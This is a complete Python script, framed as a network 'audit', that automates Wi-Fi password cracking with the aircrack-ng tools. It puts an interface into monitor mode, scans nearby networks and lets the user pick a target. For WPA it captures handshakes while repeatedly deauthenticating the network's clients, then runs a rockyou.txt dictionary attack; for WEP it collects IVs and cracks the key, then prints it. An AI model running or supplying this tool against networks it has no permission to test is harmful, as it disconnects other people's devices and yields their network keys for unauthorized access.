import os
import subprocess
import re
import time
import pandas as pd


def start_monitor_mode():
    if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
        print("Program requires superuser privilages, run with root or use sudo")
        exit()

    wlan_interface = subprocess.run('iwconfig', stdout=subprocess.PIPE ,stderr=subprocess.DEVNULL ,text=True)
    interface_search = re.findall("^wlan[0-9]", wlan_interface.stdout)

    if len(interface_search) > 1:
        while True:
            print("\nInterfaces")
            for idx, item in enumerate(interface_search):
                print(idx, item, sep=". ")
                    
            selected_interface = input("Select interface number: ")
            try:
                if interface_search[int(selected_interface)]:
                    break
            except:
                print("\nInterface not found")
    else:
        selected_interface = 0
        print("Interface",interface_search[selected_interface] ,"selected")
        
    interface_final = interface_search[int(selected_interface)]

    subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL)
    print("Conflicting processes killed")

    subprocess.run(['airmon-ng', 'start', interface_final], stdout=subprocess.DEVNULL)
    print("Monitor mode enabled")

    return interface_final


def select_network(interface):
    print("Starting network scan")
    scan = subprocess.Popen(['airodump-ng', '-w', 'networks', '--output-format', 'csv', '-I', '2', interface], 
                                                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(4)
    
    while True:
        try:
            subprocess.run('clear')
            print("To select newtwork press Ctrl + C")

            df = pd.read_csv('networks-01.csv')
            wrong_bssid = df.index[df['BSSID'] == 'Station MAC'][0]
            print(df[['BSSID', ' ESSID']].loc[:(wrong_bssid - 1)])

            time.sleep(2)
            
        except KeyboardInterrupt:
            scan.terminate()
            subprocess.run('clear')
            print("Scan stopped")
            wrong_bssid = df.index[df['BSSID'] == 'Station MAC'][0]
            print(df[['BSSID', ' ESSID']].loc[:(wrong_bssid - 1)])
            break

    while True:
        try:
            selected_network = input("Choose network number to audit: ")

            if 0 <= int(selected_network) < wrong_bssid:
                break  
            else:
                print("Network not found")
        
        except:
            print("Input error")
            break
    
    print("You chose: ", df.at[int(selected_network), ' ESSID'])

    return int(selected_network), df


def select_attack(network_id, df, interface):

    privacy = df.at[network_id, ' Privacy'].strip()
    mac = df.at[network_id, 'BSSID'].strip()
    channel = df.at[network_id, ' channel'].strip()

    if "WPA" in privacy:
        key = wpa_attack(mac, channel, interface)

    elif "WEP" in privacy:
        key = wep_attack(mac, channel, interface)

    return key, privacy

    
def wpa_attack(mac, channel, interface):

    handshake_capture = subprocess.Popen(['airodump-ng', '-w', 'wificapture', '-c', channel, '--bssid', mac, interface], 
                                                            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    print("Trying to capture handshake...")

    start_time = time.time()
    time_limit = 30

    while True:
        try:
            command_output = handshake_capture.stdout.readline()

            if "WPA handshake" in command_output or "EAPOL" in command_output:
                print("Captured handshake")
                break

            if (time.time() - start_time) > time_limit:
                print("Deauthenticating clients, next in 30s")
                deauth = subprocess.run(['aireplay-ng', '-0', '5', '-a', mac, interface], 
                                                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time_limit += 30
            
        except KeyboardInterrupt:
            break
            
    handshake_capture.terminate()

    print("Attempting to find the key...")
    key_test = subprocess.Popen(['aircrack-ng', 'wificapture-01.cap', '-w', 'rockyou.txt', '-l', 'key.txt'], 
                                                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

    start_time = time.time()
    time_limit = 2
    
    counter = 1
    while True:
        key_check_output = key_test.stdout.readline()

        if (time.time() - start_time) > time_limit:
            progress = re.findall("[^\[\d]*[\]].+ keys tested", key_check_output)
            for idx, prog in enumerate(progress):
                if len(prog) > 1:
                    print("[", counter, progress[idx])
                    counter += 1
                    time_limit += 2    

        if "KEY FOUND!" in key_check_output:
            print("Key found")
            file = open("key.txt")
            key = file.readline()
            break

        elif key_test.poll() is not None:
            key = ""
            print("End of search, key not found")
            break

    key_test.terminate()

    return key


def wep_attack(mac, channel, interface):

    iv_capture = subprocess.Popen(['airodump-ng', '-w', 'wificapture', '-c', channel, '--bssid', mac, interface], 
                                                    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    print("Trying to capture data...")
    print("Capture about 20000 IVs\nPress Ctrl + C when captured")
    time.sleep(3)

    while True:
        try:
            print(iv_capture.stdout.readline())
        except KeyboardInterrupt:
            iv_capture.terminate()
            subprocess.run('clear')
            break

    key_test = subprocess.Popen(['aircrack-ng', 'wificapture-01.cap', '-l', 'key.txt'], 
                                                    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    print("Trying to crack key...")
    
    while True:
        key_check_output = key_test.stdout.readline()
        
        if "KEY FOUND!" in key_check_output:
            print("Key found")
            file = open("key.txt")
            key = file.readline()
            break

        elif key_test.poll() is not None:
            print("Collect more IVs")
            subprocess.run('rm wificapture-01.* -f', shell=True)
            time.sleep(3)
            subprocess.run('clear')
            wep_attack(mac, channel, interface)

    key_test.terminate()

    return key


def give_feedback(id, df, key, privacy_type):

    print("\nAudit result:")
    print(df[['BSSID', ' channel', ' Speed', ' Privacy', ' Cipher', ' Authentication',' ESSID']].loc[id].to_string())


    if key != "" and "WPA" in privacy_type:
        print("Key:", key)

    elif key != "" and "WEP" in privacy_type:
        try:
            ascii_key = bytes.fromhex(key).decode("ASCII")
            print("\nKey:", ascii_key, "HEX:", key)
        except:
            print("Key:", key)

    else:
        print("Key not found")


def manage_files():
    rm_input = input("\nRemove files? [r] ")
    if rm_input == "r":
        subprocess.run('rm -f wificapture* networks* key.txt', shell=True)


if __name__ == '__main__':
    wlan_interface = start_monitor_mode()
    id, df = select_network(wlan_interface)
    key, privacy = select_attack(id, df, wlan_interface)
    give_feedback(id, df, key, privacy)
    manage_files()
